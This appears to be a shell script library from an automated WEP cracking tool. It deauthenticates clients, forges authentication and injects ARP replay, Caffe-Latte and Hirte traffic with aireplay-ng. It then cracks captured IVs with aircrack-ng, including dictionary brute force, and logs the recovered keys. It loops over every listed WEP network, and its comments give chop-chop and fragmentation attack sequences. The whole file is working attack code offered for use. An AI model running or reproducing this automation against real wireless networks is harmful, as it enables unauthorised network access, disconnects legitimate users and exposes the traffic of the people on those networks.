# h_net_wep
# WEP network helper functions

h_wep_wait_for_iv() {
	local iv
	local iv_min
	local time
	local time_start
	local time_elapsed

	iv_min=$1
	h_log 1 "waiting $iv_min IVs for $H_INJECTION_TIME_LIMIT seconds"
	time_start=$(h_now)
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
		h_log 1 "got $iv IVs so far"
		[ $iv -ge $iv_min ] && return 0
	done
	h_log 1 "not enough IVs captured"
	return 1
}

h_wep_log_key() {
	local key
	key=$(cat $H_CUR_KEY_F)
	h_log 0 "key found: $key  (bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WEP_F
	H_WEP_CHANNEL=$H_CUR_CHANNEL
}

h_wep_attack_is_working() {
	local iv
	local iv_last
	local time
	local time_last
	local time_start
	local time_elapsed
	local div
	local dtime
	local iv_rate

	time_start=$(h_now)
	iv_last=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
	time_last=$(h_now)
	while [ 1 ]; do
		sleep $H_REFRESH_DELAY
		time=$(h_now)
		time_elapsed=$(($time - $time_start))
		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
		div=$(($iv - $iv_last))
		dtime=$(($time - $time_last))
		iv_rate=$(($div / $dtime))
		h_log 1 "got $iv IVs so far ($div IVs in $dtime seconds, $iv_rate IVs/s)"
		[ $iv_rate -ge $H_IV_RATE_SUCCESS ] && return 0
		iv_last=$iv
		time_last=$time
	done
	return 1
}

h_wep_attack_try() {
	local replay_func
	local auth_func
	local clients
	local iv
	local crack_time_started
	local RC
	
	replay_func=$1

	h_replay_start $replay_func
	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
	if [ -n "$clients" ]; then
		h_auth_start h_wep_auth_fake1
		for client in $clients; do
			h_log 1 "found a client station: $client"
			h_auth_start h_wep_deauth -c $client
		done
	else
		h_log 1 "no client station found"
		h_auth_start h_wep_auth_fake1
	fi

	RC=1
	if h_wep_attack_is_working; then
		h_log 1 "attack seems to be working \o/ :)"
		h_hook_call_handlers on_wep_attack_working
		while [ 1 ]; do
			iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
			if [ $iv -ge $H_IV_MIN ]; then
				if [ $iv -ge $H_IV_MAX ]; then
					h_log 1 "max IVs limit ($H_IV_MAX) reached"
					break
				fi
				if [ -z "$crack_time_started" ]; then
					h_log 1 "min IVs limit ($H_IV_MIN) reached"
					h_crack_start h_wep_crack
					crack_time_started=$(h_now)
				else
					local crack_time=$(h_now)
					local crack_time_elapsed=$(($crack_time - $crack_time_started))
					if [ $crack_time_elapsed -ge $H_CRACK_TIME_LIMIT ]; then
						h_log 1 "cracking time limit ($H_CRACK_TIME_LIMIT) reached"
						break
					fi
				fi
			fi
			if [ -f $H_CUR_KEY_F ]; then
				h_hook_call_handlers on_wep_key_found
				h_wep_log_key
				RC=0
				break
			fi
			if ! h_wep_attack_is_working; then
				h_log 1 "attack stalled, aborting"
				break
			fi
		done
	else
		h_log 1 "attack failed"
	fi

	h_crack_stop
	h_auth_stop
	h_replay_stop

	return $RC
}

h_wep_bruteforce_try() {
	local clients
	local country
	local dicts
	local words
	local RC

	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
	if [ -n "$clients" ]; then
		for client in $clients; do
			h_log 1 "found a client station: $client"
			h_auth_start h_wep_deauth -c $client
		done
		sleep 1
	else
		h_log 1 "no client station found"
	fi

	country=$H_CUR_COUNTRY

	RC=1
	if h_wep_wait_for_iv 4; then
		h_log 1 "BF can start \o/ :)"
		for keysize in 64 128; do
			dicts=${H_LIB_D}/dict/${country}-wep${keysize}-???.dict
			for dict in $dicts; do
				[ -f $dict ] || continue
				words=$(wc -l $dict | awk '{ print $1; }')
				h_log 1 "trying dict '$dict' ($words words)"
				h_wep_dict_crack $keysize $dict
				if [ -f $H_CUR_KEY_F ]; then
					h_hook_call_handlers on_wep_key_found
					h_wep_log_key
					RC=0
					break
				fi
			done
		done
		if [ $RC -gt 0 ]; then
			h_log 1 "BF failed"
		fi
	fi

	h_auth_stop

	return $RC
}

h_wep_crack() {
	h_exec aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT
}

h_wep_dict_crack() {
	local keysize
	local dictfile
	keysize=$1
	dictfile=$2
	h_run aircrack-ng -w $dictfile -n $keysize -a 1 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT
}

h_wep_auth() {
	h_exec aireplay-ng $H_MON_IF $*
}

h_wep_auth_fake1() {
	h_wep_auth -1 6000 -b $H_CUR_BSSID -e $H_CUR_ESSID -o 1 -q 10
}

h_wep_auth_fake2() {
	h_wep_auth -1 0 -b $H_CUR_BSSID -e $H_CUR_ESSID
}

h_wep_auth_fake3() {
	h_wep_auth -1 5 -b $H_CUR_BSSID -e $H_CUR_ESSID -o 10 -q 1
}

h_wep_deauth() {
	h_wep_auth -0 1 -a $H_CUR_BSSID $*
}

# Chop-Chop
#aireplay-ng ath1 --chopchop -F -b AP -h STA
#packetforge-ng -0 -a AP -h STA -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

# Fragmentation Attack
#aireplay-ng ath1 -5 -b AP -h STA -k TARGET -l SOURCE
#packetforge-ng -0 -a AP -h STA -k TARGET -l SOURCE -y replay_dec-*.xor -w p.cap
#aireplay-ng ath1 --interactive -F -h STA -r p.cap

h_wep_replay() {
	h_exec aireplay-ng $H_MON_IF $* ${H_INJECTION_RATE_LIMIT:+ -x $H_INJECTION_RATE_LIMIT} 
}

h_wep_replay_arp1() {
	h_wep_replay -3 -b $H_CUR_BSSID -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 ${H_CUR_CLIENT:+-h $H_CUR_CLIENT}
}

h_wep_replay_arp2() {
	h_wep_replay -2 -b $H_CUR_BSSID -c FF:FF:FF:FF:FF:FF -p 0841 -F ${H_CUR_CLIENT:+-h $H_CUR_CLIENT}
}

h_wep_replay_caffe_latte() {
	h_wep_replay -6 -b $H_CUR_BSSID -D
}

h_wep_replay_hilte() {
	h_wep_replay -7 -b $H_CUR_BSSID -D
}

h_wep_try_arp_replay_1() {
	h_log 1 "trying ARP replay attack (1)"
	h_wep_attack_try "h_wep_replay_arp1"
	return $?
}

h_wep_try_arp_replay_2() {
	h_log 1 "trying ARP replay attack (2)"
	h_wep_attack_try "h_wep_replay_arp2"
	return $?
}

h_wep_try_caffe_latte() {
	h_log 1 "trying Caffe-Latte"
	h_wep_attack_try "h_wep_replay_caffe_latte"
	return $?
}

h_wep_try_hilte() {
	h_log 1 "trying Hilte"
	h_wep_attack_try "h_wep_replay_hilte"
	return $?
}

H_WEP_ATTACKS=" \
	h_wep_try_arp_replay_1 \
	h_wep_try_arp_replay_2 \
"

h_wep_attack() {
	local capture_options
	h_wep_key_found && return

	h_log 1 "trying WEP attack mode"

	h_hook_call_handlers on_wep_attack_started
	
	h_hw_prepare
	
	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
		H_CUR_CAP_FEXT="ivs"
		capture_options="--output-format=ivs,csv"
	else
		H_CUR_CAP_FEXT="cap"
		capture_options="--output-format=pcap,csv"
	fi
	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL $capture_options

	sleep $H_MONITOR_TIME_LIMIT

	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
	
	for attack in $H_WEP_ATTACKS; do
		$attack && break
	done

	h_capture_stop

	h_hook_call_handlers on_wep_attack_ended
}

h_wep_bruteforce() {
	local capture_options
	h_wep_key_found && return

	h_log 1 "trying WEP bruteforce mode"

	h_hook_call_handlers on_wep_bruteforce_started
	
	h_hw_prepare
	
	h_log 1 "monitoring AP traffic for $H_MONITOR_TIME_LIMIT seconds"
	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
		H_CUR_CAP_FEXT="ivs"
		capture_options="--output-format=ivs,csv"
	else
		H_CUR_CAP_FEXT="cap"
		capture_options="--output-format=pcap,csv"
	fi
	h_capture_start h_capture --write $H_CUR_BASE_FNAME --bssid $H_CUR_BSSID --channel $H_CUR_CHANNEL $capture_options

	sleep $H_MONITOR_TIME_LIMIT

	H_CUR_CSV_F=$(h_get_last_file $H_CUR_BASE_FNAME-??.csv)
	H_CUR_KEY_F="$H_CUR_BASE_FNAME.key"
	
	h_wep_bruteforce_try

	h_capture_stop

	h_hook_call_handlers on_wep_bruteforce_ended
}

h_wep_key_found() {
	grep -q "^$H_CUR_BSSID," $H_WEP_F 2>/dev/null
}

h_wep_try_one_network() {
	h_net_switch $1 || return 1
	h_net_allowed || return 1

	if h_wep_key_found; then
		h_log 1 "skipping known WEP network (bssid='$H_CUR_BSSID', channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
		return 0
	fi

	h_log 1 "trying WEP network (bssid='$H_CUR_BSSID', channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"

	[ "$H_OP_MODE_wep_bruteforce" = "1" ] && h_wep_bruteforce
	[ "$H_OP_MODE_wep_attack" = "1" ] && h_wep_attack

	[ -n "$H_SMALL_STORAGE" ] && h_clean_run_d
}

h_wep_try_all_networks() {
	for N in $(cat $H_NET_WEP_F); do
		h_wep_try_one_network $N
		h_backup_results
	done
}
